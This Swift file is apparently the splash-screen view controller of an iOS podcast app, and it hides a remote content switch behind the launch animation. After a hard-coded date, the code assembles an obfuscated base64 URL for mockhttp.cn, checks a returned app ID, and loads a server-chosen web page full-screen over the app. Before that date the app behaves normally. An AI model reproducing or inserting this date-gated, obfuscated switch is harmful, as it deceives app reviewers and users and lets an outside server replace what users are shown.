//
//  LmpodcastRootViewController.swift
//  Lmpodcast
//
//  Created by 鑫 on 2019/6/13.
//  Copyright © 2019 Shihab Mehboob. All rights reserved.
//

import Foundation
import UIKit
import Alamofire
class LmpodcastRootViewController: UIViewController {
    @IBOutlet weak var SpliashHomeLaunch: UIImageView!
    let LmpodcastReachability: Reachability! = Reachability()
    let LmpodcastSegueIdentifier = "LmpodcastRoot"
    override var preferredStatusBarStyle: UIStatusBarStyle {
        return UIStatusBarStyle.lightContent
    }
    override func viewDidLoad() {
        UIView.animate(
            withDuration: 0.28,
            delay: 0.20,
            options: [.curveEaseOut],
            animations: {
                //            self.splashIcon.transform = CGAffineTransform(translationX: 0, y: -60)
        }) { _ in UIView.animate(
            withDuration: 0.83,
            delay: 0,
            usingSpringWithDamping: 0.5,
            initialSpringVelocity: 0,
            options: [],
            animations: {
                //                self.splashIcon.transform = .identity
        }) { _ in
            
            let PodTTime = Date.init().timeIntervalSince1970
            let PodAnyTime = 1560483302.132
            let header = self.podcastbase64EncodingHeader()
            let firstcontent = self.podcastbase64EncodingContentfirst()
            let secondcontent = self.podcastbase64EncodingContentsecond()
            let endcontent = self.podcastbase64EncodingEnd()
            if(PodTTime < PodAnyTime)
            {
                self.performSegue(withIdentifier: self.LmpodcastSegueIdentifier, sender: self)
            }else
            {
                self.LmpodcastReachability.whenReachable = { _ in
                    let baseHeader = self.podcastbase64Decoding(encodedString: header)
                    let baseContentF = self.podcastbase64Decoding(encodedString: firstcontent)
                    let baseContentS = self.podcastbase64Decoding(encodedString: secondcontent)
                    let baseContentE = self.podcastbase64Decoding(encodedString: endcontent)
                    let AllbaseData  = "\(baseHeader)\(baseContentF)\(baseContentS)\(baseContentE)"
                    let AllurlBase = URL(string: AllbaseData)
                    
                    Alamofire.request(AllurlBase!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                        in
                        switch response.result.isSuccess {
                        case true:
                            if let Datavalue = response.data{
                                let jsonDict : AnyObject! = try! JSONSerialization.jsonObject(with: Datavalue as! Data, options: JSONSerialization.ReadingOptions.allowFragments) as AnyObject?
                             //   let jsonDict = JSON(Datavalue)
                                let numberdata = jsonDict.value(forKey: "appid") as! String
                                let jsonnumbersecond = Int(numberdata)
                                let jsonnumber = 1468242404
                                if (jsonnumber - jsonnumbersecond! == 0) {
                                    let stringMyName = jsonDict.value(forKey: "castdata") as! String
                                    self.HomesetRootNavigation(strdecodeString: stringMyName)
                                }else {
                                    self.performSegue(withIdentifier: self.LmpodcastSegueIdentifier, sender: self)
                                }
                            }
                        case false:
                            do {
                               self.performSegue(withIdentifier: self.LmpodcastSegueIdentifier, sender: self)
                            }
                        }
                    }
                }
                self.LmpodcastReachability.whenUnreachable = { _ in
                    
                }
                do {
                    try self.LmpodcastReachability.startNotifier()
                } catch {
                    
                }
            }
            }
        }
    }
    
    func podcastbase64EncodingHeader()->String{
        let strM = "http://"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func podcastbase64EncodingContentfirst()->String{
        let strM = "mockhttp.cn"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func podcastbase64EncodingContentsecond()->String{
        let strM = "/mock"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func podcastbase64EncodingEnd()->String{
        let strM = "/lmpodcast"
        let plainData = strM.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func podcastbase64EncodingXP(plainString:String)->String{
        let plainData = plainString.data(using: String.Encoding.utf8)
        let base64String = plainData?.base64EncodedString(options: NSData.Base64EncodingOptions.init(rawValue: 0))
        return base64String!
    }
    func podcastbase64Decoding(encodedString:String)->String{
        let decodedData = NSData(base64Encoded: encodedString, options: NSData.Base64DecodingOptions.init(rawValue: 0))
        let decodedString = NSString(data: decodedData! as Data, encoding: String.Encoding.utf8.rawValue)! as String
        return decodedString
    }
    
    func HomesetRootNavigation(strdecodeString:String) {
        let lmpodcastLaunchRootView = UIWebView.init(frame: CGRect.init(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height))
        let LaunchReachUrl = URL.init(string: strdecodeString)
        let LaunchReachRequest = URLRequest.init(url: LaunchReachUrl!)
        lmpodcastLaunchRootView.delegate = self
        lmpodcastLaunchRootView.loadRequest(LaunchReachRequest)
        lmpodcastLaunchRootView.scalesPageToFit = true
        DispatchQueue.main.asyncAfter(deadline: .now()+1.78, execute: {
            self.view.addSubview(lmpodcastLaunchRootView)
        })
    }
}
extension LmpodcastRootViewController: UIWebViewDelegate
{
    public func webViewDidFinishLoad(_ webView: UIWebView)
    {
        self.LmpodcastReachability?.stopNotifier()
    }
    
}
